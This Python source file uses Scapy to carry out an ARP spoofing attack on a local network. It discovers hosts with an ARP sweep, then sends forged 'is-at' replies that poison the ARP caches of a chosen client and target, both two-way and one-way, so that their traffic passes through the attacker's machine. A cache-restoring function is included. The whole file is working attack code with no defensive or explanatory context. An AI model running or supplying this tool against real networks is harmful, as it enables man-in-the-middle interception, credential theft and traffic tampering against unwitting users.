from scapy.all import * 
HOST_LIST = {}

# Keep a socket open so that scapy doesn't open and close a new socket with every send
s = conf.L3socket(iface='eth0')

def discovery(network):
    print("Begin host discovery in network " + network)
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = ether/arp

    result = srp(arp_packet, timeout=3, verbose=0, iface='eth0')[0]

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        HOST_LIST[received.psrc] = received.hwsrc
    print("Discovered hosts: \n " + str(HOST_LIST))

def get_mac(target_ip):
    arp_packet= ARP(op="who-has", pdst=target_ip)
    ans, unans= sr(arp_packet, timeout=3 , verbose= False)
    print("MAC address of " + target_ip + " is " + ans[0][1].hwsrc)
    return ans[0][1].hwsrc

def arp_poison(client_ip, target_ip):
    print("Poisoning " + target_ip + " <==> " + client_ip)
    host_arp = ARP(op='is-at', psrc=client_ip, pdst=target_ip,  hwdst=HOST_LIST[target_ip]) #poison target pretending to be the client
    client_arp = ARP(op='is-at', psrc=target_ip, pdst=client_ip, hwdst=HOST_LIST[client_ip]) #poison the client pretending to be the target
    s.send(host_arp)
    s.send(client_arp)

def one_way_poison(client_ip, target_ip):
    print("One-way poisoning " + client_ip + " ==> " + target_ip)
    client_arp = ARP(op='is-at', psrc=target_ip, pdst=client_ip, hwdst=HOST_LIST[client_ip])
    s.send(client_arp)

def restore_tables(client_ip, target_ip):
    print("Restoring ARP cache in targets " + target_ip + "<==>" + client_ip)
    s.send(ARP(op = 2, pdst = target_ip, psrc = client_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = HOST_LIST[client_ip]), count = 7)
    s.send(ARP(op = 2, pdst = client_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = HOST_LIST[target_ip]), count = 7)
